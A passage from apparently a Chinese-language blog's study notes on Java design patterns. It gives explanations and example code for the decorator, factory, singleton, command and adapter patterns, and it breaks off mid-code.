class="params">(EncryptComponent encryptComponent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(encryptComponent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> otherAEncrypt(<span class="built_in">super</span>.encrypt(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">otherAEncrypt</span><span class="params">(String str)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;对字符串 \&#x27;&quot;</span>+str+<span class="string">&quot;\&#x27; 使用OtherA加密   =====&gt;  OtherA加密结果&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;OtherA 加密结果&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        EncryptComponent originalEncrypt, otherAEncrypt, otherBEncrypt;</span><br><span class="line">        String result;</span><br><span class="line">    	originalEncrypt = <span class="keyword">new</span> <span class="title class_">OriginalEncrypt</span>();</span><br><span class="line">        result = originalEncrypt.encrypt(<span class="string">&quot;初始数据&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        otherAEncrypt = <span class="keyword">new</span> <span class="title class_">OtherAEncrypt</span>(originalEncrypt);</span><br><span class="line">        result = otherAEncrypt.encrypt(<span class="string">&quot;初始数据&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        otherBEncrypt = <span class="keyword">new</span> <span class="title class_">OtherBEncrypt</span>(originalEncrypt);</span><br><span class="line">        result = otherBEncrypt.encrypt(<span class="string">&quot;初始数据&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        otherBEncrypt = <span class="keyword">new</span> <span class="title class_">OtherBEncrypt</span>(otherAEncrypt);</span><br><span class="line">        result = otherBEncrypt.encrypt(<span class="string">&quot;初始数据&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227155641606.png" alt="image-20241227155641606"></p>
<h3 id="工厂模式-Factory-Pattern"><a href="#工厂模式-Factory-Pattern" class="headerlink" title="工厂模式 Factory Pattern"></a>工厂模式 Factory Pattern</h3><h4 id="简单工厂模式-Simple-Factory"><a href="#简单工厂模式-Simple-Factory" class="headerlink" title="简单工厂模式 Simple Factory"></a>简单工厂模式 Simple Factory</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224160308994.png" alt="image-20241224160308994" style="zoom:50%;" />

<p>简单工厂把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。<br>这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。客户类往往有多个，如果不使用简单工厂，那么所有的客户类都要知道所有子类的细节。而且一旦子类发生改变。例如增加子类那么所有的客户类都要进行修改。</p>
<p>简单工厂其实并不是一个设计模式，反而比较像一个编程习惯。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFactory</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> Product <span class="title function_">createProduct</span><span class="params">(<span class="type">int</span> type)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (type==<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (type==<span class="number">2</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct3</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">SimpleFactory</span> <span class="variable">simpleFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleFactory</span>();</span><br><span class="line">        <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> simpleFactory.createProduct(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="工厂方法模式-Factory-Method"><a href="#工厂方法模式-Factory-Method" class="headerlink" title="工厂方法模式 Factory Method"></a>工厂方法模式 Factory Method</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227155930652.png" alt="image-20241227155930652"></p>
<p>工厂方法模式定义了一个创建对象的接口，但由子类决定要实例化的类是哪一个。工厂方法让类的实例化推迟到子类。</p>
<p>在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Factory</span>&#123;</span><br><span class="line">	<span class="keyword">abstract</span> <span class="keyword">public</span> Product <span class="title function_">factoryMethod</span><span class="params">()</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> factoryMethod();</span><br><span class="line">		<span class="comment">// do something with the product</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteFactory1</span> <span class="keyword">extends</span> <span class="title class_">Factory</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> Product <span class="title function_">factoryMethod</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteFactory2</span> <span class="keyword">extends</span> <span class="title class_">Factory</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> Product <span class="title function_">factoryMethod</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteProduct2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>工厂方法的优缺点</strong></p>
<p>工厂方法模式（Factory Method）是一种常用的设计模式，它在创建对象时提供了更多的灵活性和扩展性。了解其优缺点有助于更好地决定何时使用这种模式。</p>
<p>优点</p>
<ol>
<li>分离职责：<strong>工厂方法模式将对象的创建和使用分离</strong>，降低了类之间的耦合度。这种分离使得客户端代码从具体类的创建中解耦，提高了系统的灵活性和可维护性。</li>
<li><strong>符合开闭原则：在引入新的产品类时，不需要修改已有代码，只需添加相应的工厂类</strong>。这符合开闭原则，即对扩展开放，对修改关闭。</li>
<li>扩展性：可以很容易地引入新的产品类型，并用新的具体工厂来创建这些产品，使得系统更易于扩展。</li>
<li>隐藏创建逻辑：工厂方法<strong>隐藏了对象创建的细节</strong>，客户端不需要知道具体实现，只需关心所需产品的接口。</li>
</ol>
<p>缺点</p>
<ol>
<li><strong>类的数量增多：每添加一个新的产品，就需要添加一个具体的工厂类</strong>，这会导致类的数量成倍增加，增加了系统的复杂度。</li>
<li><strong>增加了系统的抽象性</strong>：引入工厂类也增加了系统的抽象性和理解难度。</li>
<li>代码复用性降低：由于每个工厂只创建一种产品，这可能会导致工厂之间的代码重复。</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227160020421.png" alt="image-20241227160020421"></p>
<h4 id="抽象工厂模式-Abstract-Factory"><a href="#抽象工厂模式-Abstract-Factory" class="headerlink" title="抽象工厂模式 Abstract Factory"></a>抽象工厂模式 Abstract Factory</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224162737150.png" alt="image-20241224162737150"></p>
<p>抽象工厂模式提供一个接口，用于创建相关或依赖对象的<strong>家族</strong>，而不需要明确指定具体类。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241227160125249.png" alt="image-20241227160125249"></p>
<p><strong>三个工厂模式之间的关系</strong></p>
<ol>
<li>递进关系：简单工厂模式是最简单的形式，工厂方法模式在此基础上增加了更多的抽象和灵活性，而抽象工厂模式是在工厂方法的基础上进一步扩展，用于处理产品族的创建。</li>
<li>灵活性和复杂性：简单工厂模式最简单，但灵活性较差；工厂方法模式灵活性较高，但实现相对复杂；抽象工厂模式灵活性最高，但实现最为复杂。</li>
</ol>
<h3 id="单例模式-Singleton-Pattern"><a href="#单例模式-Singleton-Pattern" class="headerlink" title="单例模式 Singleton Pattern"></a>单例模式 Singleton Pattern</h3><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224164043228.png" alt="image-20241224164043228" style="zoom:50%;" />

<p>单例模式确定一个类只有一个实例，并提供一个全局访问点。</p>
<h4 id="懒汉式——线程不安全"><a href="#懒汉式——线程不安全" class="headerlink" title="懒汉式——线程不安全"></a>懒汉式——线程不安全</h4><p>uniqueInstance可能被多次实例化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton uniqueInstance;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>)</span><br><span class="line">			uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">		<span class="keyword">return</span> uniqueInstance;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="直接实例化——线程安全"><a href="#直接实例化——线程安全" class="headerlink" title="直接实例化——线程安全"></a>直接实例化——线程安全</h4><p>丢失了延迟实例化带来的节约资源的好处。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">uniqueInstance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> uniqueInstance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="懒汉式——线程安全"><a href="#懒汉式——线程安全" class="headerlink" title="懒汉式——线程安全"></a>懒汉式——线程安全</h4><p>uniqueInstance只会被实例化一次，但即使uniqueInstance已经被实例化了，线程被阻塞仍然需要等待，影响性能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span>&#123;...&#125;</span><br></pre></td></tr></table></figure>

<h4 id="双重检查锁——线程安全"><a href="#双重检查锁——线程安全" class="headerlink" title="双重检查锁——线程安全"></a>双重检查锁——线程安全</h4><p>双重检验锁先判断uniqueInstance是否已经被实例化，如果没有实例化，才对实例化语句进行加锁。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton uniqueInstance; <span class="comment">// 注意 volatile</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>)&#123;			      <span class="comment">// 双重校验锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>)&#123;</span><br><span class="line">                    uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> uniqueInstance;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>关于使用volatile关键字：</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224165506265.png" alt="image-20241224165506265"></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102111011608.png" alt="image-20250102111011608"></p>
<h3 id="命令模式-Command-Pattern"><a href="#命令模式-Command-Pattern" class="headerlink" title="命令模式 Command Pattern"></a>命令模式 Command Pattern</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102132814584.png" alt="image-20250102132813243"></p>
<p>命令模式将“请求”封装成对象，以便使用不同的请求、队列或日志来参数化其他对象。命令模式也支持可撤销的操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Command</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">undo</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开灯命令</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LightOnCommand</span> <span class="keyword">implements</span> <span class="title class_">Command</span>&#123;</span><br><span class="line">    Light light;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LightOnCommand</span><span class="params">(Light light)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.light = light;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>&#123;</span><br><span class="line">        light.on();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">undo</span><span class="params">()</span>&#123;</span><br><span class="line">        light.off(); <span class="comment">//撤销操作与execute相反</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关灯命令</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LightOffCommand</span> <span class="keyword">implements</span> <span class="title class_">Command</span>&#123;</span><br><span class="line">    Light light;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LightOffCommand</span><span class="params">(Light light)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.light = light;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>&#123;</span><br><span class="line">        light.off();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">undo</span><span class="params">()</span>&#123;</span><br><span class="line">        light.on();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认命令，这是一个空对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoCommand</span> <span class="keyword">implements</span> <span class="title class_">Command</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//do nothing</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">undo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Light</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">on</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Light is on!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">off</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Light is off!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遥控器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Invoker</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Command[] onCommands;</span><br><span class="line">    <span class="keyword">private</span> Command[] offCommands;</span><br><span class="line">    <span class="keyword">private</span> Command undoCommand; <span class="comment">// 记录前一个命令，用于撤销</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">slotNum</span> <span class="operator">=</span> <span class="number">7</span>；</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Invoker</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.onCommands = <span class="keyword">new</span> <span class="title class_">Command</span>[slotNum];</span><br><span class="line">        <span class="built_in">this</span>.offCommands = <span class="keyword">new</span> <span class="title class_">Command</span>[slotNum];</span><br><span class="line">        </span><br><span class="line">        <span class="type">Command</span> <span class="variable">noCommand</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NoCommand</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;slotNum;i++)&#123;</span><br><span class="line">            onCommands[i] = noCommand;</span><br><span class="line">            offCommands[i] = noCommand;</span><br><span class="line">        &#125;</span><br><span class="line">        undoCommand = noCommand;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置命令</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCommand</span><span class="params">(<span class="type">int</span> slot, Command onCommand, Command offCommand)</span>&#123;</span><br><span class="line">        onCommands[slot] = onCommand;</span><br><span class="line">        offCommands[slot] = offcommand;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onButtonWasPushed</span><span class="params">(<span class="type">int</span> slot)</span>&#123;</span><br><span class="line">        onCommands[slot].execute();</span><br><span class="line">        undoCommand = onCommands[slot];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">offButtonWasPushed</span><span class="params">(<span class="type">int</span> slot)</span>&#123;</span><br><span class="line">        offCommands[slot].execute();</span><br><span class="line">        undoCommand = offCommands[slot];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="宏命令-Macro-Command"><a href="#宏命令-Macro-Command" class="headerlink" title="宏命令 Macro Command"></a>宏命令 Macro Command</h4><p>宏命令是一种特殊的命令，它可以执行一系列的命令。简单来说，宏命令是命令的集合，当执行宏命令时，它内部的所有命令依序执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令接口</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Command</span> &#123;</span><br><span class="line">     <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 宏命令类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MacroCommand</span> <span class="keyword">implements</span> <span class="title class_">Command</span> &#123;</span><br><span class="line">     <span class="comment">// 存储命令对象的列表</span></span><br><span class="line">     <span class="keyword">private</span> List&lt;Command&gt; commands = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 添加命令</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCommand</span><span class="params">(Command command)</span> &#123;</span><br><span class="line">         commands.add(command);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 删除命令</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeCommand</span><span class="params">(Command command)</span> &#123;</span><br><span class="line">         commands.remove(command);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 执行宏命令，即依次执行列表中的所有命令</span></span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">         <span class="keyword">for</span> (Command command : commands) &#123;</span><br><span class="line">             command.execute();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 测试类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMacroCommand</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">MacroCommand</span> <span class="variable">macro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MacroCommand</span>();</span><br><span class="line">         </span><br><span class="line">         <span class="comment">// 添加具体命令</span></span><br><span class="line">         macro.addCommand(<span class="keyword">new</span> <span class="title class_">ConcreteCommandA</span>());</span><br><span class="line">         macro.addCommand(<span class="keyword">new</span> <span class="title class_">ConcreteCommandB</span>());</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 执行宏命令</span></span><br><span class="line">         macro.execute();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250102111104869.png" alt="image-20250102111104869"></p>
<h3 id="适配器模式-Adapter-Pattern"><a href="#适配器模式-Adapter-Pattern" class="headerlink" title="适配器模式 Adapter Pattern"></a>适配器模式 Adapter Pattern</h3><p>适配器模式将一个类的接口，转换成客户期望的另一个接口。适配器让原本接口不兼容的类可以无间合作。</p>
<h4 id="对象适配器"><a href="#对象适配器" class="headerlink" title="对象适配器"></a>对象适配器</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224173526153.png" alt="image-20241224173526153"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Duck</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quark</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Turkey</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gobble</span><span class="params">()</span>;  <span class="comment">//火鸡只会gobble</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span>;	   <span class="comment">//火鸡飞不远</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象适配器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TurkeyAdapter</span> <span class="keyword">implements</span> <span class="title class_">Duck</span>&#123;</span><br><span class="line">	Turkey turkey;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">TurkeyAdapter</span><span class="params">(Turkey turkey)</span>&#123;</span><br><span class="line">		<span class="built_in">this</span>.turkey = turkey;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">quack</span><span class="params">()</span>&#123;</span><br><span class="line">		turkey.gobble();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">			turkey.fly();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="类适配器"><a href="#类适配器" class="headerlink" title="类适配器"></a>类适配器</h4><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241224174128646.png" alt="image-20241224174128646"></p>
<p>注意：<strong>Java无法实现多继承</strong>。</p>
<h4 id="双向适配器"><a href="#双向适配器" class="headerlink" title="双向适配器"></a>双向适配器</h4><p>在软件设计中，双向适配器模式是适配器模式的一个变体，它允许两个不兼容的接口之间进行双向通信。在标准的适配器模式中，适配器通常使得一个类看起来像另一个类，而<strong>在双向适配器模式中，适配器同时兼容两个不同的接口。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一个接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">InterfaceA</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">InterfaceB</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现第一个接口的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> <span class="keyword">implements</span> <span class="title class_">InterfaceA</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassA methodA()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现第二个接口的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span> <span class="keyword">implements</span> <span class="title class_">InterfaceB</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassB methodB()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向适配器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TwoWayAdapter</span> <span class="keyword">implements</span> <span class="title class_">InterfaceA</span>, InterfaceB &#123;</span><br><span class="line">    <span class="keyword">private</span> InterfaceA classA;</span><br><span class="line">    <span class="keyword">private</span> InterfaceB classB;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TwoWayAdapter</span><span class="params">(InterfaceA classA, InterfaceB classB)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classA = classA;</span><br><span class="line">        <span class="built_in">this</span>.classB = classB;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        classB.methodB();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        classA.methodA();</span><br><span class="line">  